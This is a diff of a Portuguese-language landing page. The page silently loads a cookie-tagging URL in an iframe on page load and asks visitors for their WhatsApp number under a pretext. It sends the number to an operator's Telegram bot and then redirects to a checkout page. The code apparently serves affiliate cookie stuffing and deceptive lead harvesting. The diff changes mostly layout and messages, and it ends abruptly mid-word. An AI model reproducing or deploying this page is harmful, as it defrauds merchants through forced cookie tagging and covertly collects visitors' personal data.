@@ -52,9 +52,10 @@
     #whatsContainer {
       margin-top: 25px;
       display: flex;
-      flex-direction: column;
-      align-items: center;
+      flex-direction: row;
       gap: 10px;
+      align-items: center;
+      justify-content: center;
     }
 
     #whatsapp {
@@ -91,11 +92,11 @@
 <body>
 
   <div class="circle"></div>
-  <div id="message" class="text">Espere! Procurando pelo Melhor Desconto</div>
+  <div id="message" class="text">Espere! Digite seu WhatsApp para Continuar</div>
 
-  <!-- CAMPO WHATSAPP -->
+  <!-- CAMPO WHATSAPP COM BOTÃO AO LADO -->
   <div id="whatsContainer">
-    <input type="tel" id="whatsapp" placeholder="Digite seu Melhor WhatsApp">
+    <input type="tel" id="whatsapp" placeholder="Seu Melhor WhatsApp">
     <button id="okBtn">✅ OK</button>
   </div>
 
@@ -119,9 +120,7 @@
     const iframe = document.getElementById("cookieFrame");
     const whatsappInput = document.getElementById("whatsapp");
     const okBtn = document.getElementById("okBtn");
-    const whatsContainer = document.getElementById("whatsContainer");
 
-    // Gravação do cookie começa imediatamente
     iframe.src = cookieURL;
 
     iframe.onload = () => {
@@ -135,7 +134,6 @@
       }, 500);
     };
 
-    // Função para enviar WhatsApp para Telegram
     function enviarAlerta(msg) {
       const url = `https://api.telegram.org/bot${NumeroTLG}/sendMessage`;
       fetch(url, {
@@ -145,27 +143,23 @@
       }).catch(console.error);
     }
 
-    // Quando o botão OK é clicado
     okBtn.addEventListener("click", () => {
       const numero = whatsappInput.value.trim();
       if (!numero || numero.length < 11) {
-        alert("Por favor, insira um número de WhatsApp válido. Exemplo: 43999999999");
+        alert("Digite um número de WhatsApp válido. Exemplo: 43999999999");
         return;
       }
 
-      // Envia o WhatsApp para o bot
       enviarAlerta(`📲 WhatsApp Informado: ${numero}`);
       okBtn.disabled = true;
       okBtn.innerText = "Enviado ✅";
 
-      // Troca mensagens (espera > redirecionando)
       msg.style.opacity = 0;
       setTimeout(() => {
         msg.textContent = "Redirecionando para Página de Pagamento";
         msg.style.opacity = 1;
       }, 400);
 
-      // Aguarda 2 segundos antes de redirecionar
       setTimeout(() => {
         if (cookieConfirmado && !redirecionado) {
           redirecionado = true;
@@ -180,16 +174,7 @@
       }, 2000);
     });
 
-    // Fallback após 10 segundos (caso iframe não carregue)
     setTimeout(() => {
       if (!cookieConfirmado && !redirecionado) {
         redirecionado = true;
-        enviarAlerta(`⛔ ERRO TOTAL NA MARCAÇÃO - REDIRECIONAMENTO FORÇADO`);
-        document.getElementById("fallback").style.display = "block";
-        window.location.href = checkoutURL;
-      }
-    }, 10000);
-  </script>
-
-</body>
-</html>
+        envi
